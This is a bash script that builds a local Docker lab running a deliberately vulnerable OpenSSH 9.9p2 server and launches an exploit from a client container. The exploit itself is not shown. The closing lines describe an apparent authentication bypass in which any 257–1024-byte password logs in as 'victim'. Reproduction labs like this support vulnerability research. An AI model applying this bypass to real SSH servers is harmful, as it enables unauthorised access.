#!/usr/bin/env bash
# Build and run the local reproduction lab.
set -euo pipefail

DIR="$(cd "$(dirname "$0")" && pwd)"
NET="sshole-lab"
SERVER="sshole-server"
CLIENT="sshole-client"

echo "[*] Building vulnerable server image (OpenSSH 9.9p2 + musl, no PAM)..."
docker build -q -t "$SERVER" -f "$DIR/Dockerfile.server" "$DIR"

echo "[*] Building client image..."
docker build -q -t "$CLIENT" -f "$DIR/Dockerfile.client" "$DIR"

docker network create "$NET" >/dev/null 2>&1 || true
docker rm -f "$SERVER" >/dev/null 2>&1 || true

echo "[*] Starting sshd container (host port 2222 -> container 22)..."
docker run -d --name "$SERVER" --network "$NET" -p 127.0.0.1:2222:22 "$SERVER" >/dev/null

echo "[*] Waiting for sshd..."
for _ in $(seq 1 40); do
    if docker exec "$SERVER" sh -c 'netstat -ltn 2>/dev/null | grep -q ":22 "' 2>/dev/null; then
        break
    fi
    sleep 0.5
done

echo
docker logs "$SERVER" 2>&1 | sed 's/^/    /'
echo

echo "[*] Running exploit from a separate client container..."
docker run --rm --network "$NET" "$CLIENT"

echo
echo "[*] sshd log (look for 'Accepted password for victim'):"
docker logs "$SERVER" 2>&1 | grep -E 'Accepted|Failed|Invalid|userauth' | tail -20 | sed 's/^/    /' || true

echo
echo "[*] Lab still running. Manual test from the host:"
echo "    ssh -p 2222 victim@127.0.0.1      # any 257..1024-byte password"
echo "    Stop with: docker rm -f $SERVER && docker network rm $NET"
